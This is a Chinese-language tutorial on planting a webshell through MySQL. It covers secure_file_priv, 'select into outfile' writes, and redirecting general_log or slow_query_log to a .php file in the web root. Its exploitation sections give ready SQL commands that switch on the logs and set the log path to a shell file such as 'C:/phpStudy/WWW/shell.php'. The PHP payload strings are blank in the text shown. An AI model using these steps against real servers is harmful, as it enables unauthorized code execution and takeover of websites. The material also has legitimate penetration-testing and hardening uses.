常见写WebShell方法

secure_file_priv模式介绍

secure_file_priv是用来限制load dumpfile、into outfile、load_file()函数在哪个⽬录下拥有 上传和读取⽂件的权限，在mysql 5.6.34版本以后 secure_file_priv的值默认为NULL。

关于secure_file_priv的配置介绍:

  • 当secure_file_priv的值为null ，表示限制mysqld不允许导⼊|导出;
  • 当secure_file_priv的值为/tmp/,表示限制mysqld 的导⼊|导出只能发⽣在/tmp/⽬录下;
  • 当secure_file_priv的值没有具体值时，表示不对mysqld 的导⼊|导出做限制这⾥为 nulll。
select into outfile直接写⼊

利用条件：

1、知道网站绝对路径

2、对Web目录有读写权限

3、高权限数据库用户

4、没有运⾏在secure_file_priv模式下

  • 查看mysql安全设置：show global variables like ‘%secure_file_priv%’;

    • 图中secure_file_priv的值为null，需要先更改mysql.ini配置文件的secure_file_priv=

secure_file_priv 可以设置三个参数：空，NULL，filepath

参数说明：

​ 空值：设置为空时，没有进⾏安全配置，那么这模式下应该就可以导出webshell;

​ NULL：设置本参数值时，数据库不能进⾏导⼊导出;

​ filepath：filepath 是导⼊导出的⽂件路径，设置这个值，那么只能导出⽂件到 filepath 的 路径。

  • 漏洞利用：

    • 联合查询写shell

    • sqlmap写shell

    • mysql写shell

全局日志GetShell

利用条件：

1、数据库为root权限

2、Web目录可写

3、知道Web目录绝对路径

  • 漏洞利用

    • 查看配置：show variables like ‘%general%’;

    • 开启general log模式：set global general_log = on;

    • 设置日志目录为shell地址（绝对路径通过phpinfo获取）：set global general_log_file = ‘C:/phpStudy/WWW/tm.php’;

    • 写入shell内容，记录到日志：select ‘’

使用慢查询日志GetShell

慢查询日志记录所有执行时间超过long_query_time秒的所有查询或者不使⽤索引的查询。

默认情况下，MySQL数据库是不开启慢查询⽇志

long_query_time的默认值为10（即10秒，通常设置为1秒），即运⾏10秒以上的语句是慢 查询语句。

  • 漏洞利用
    • 查看配置：show variables like ‘%slow%’;
    • 修改日志文件绝对路径及文件名：set global slow_query_log_file = ‘C:/phpStudy/WWW/shell.php’;
    • 启用慢查询日志：set GLOBAL slow_query_log=on;
    • 通过慢查询写shell： select ‘’ from mysql.db where sleep(10);
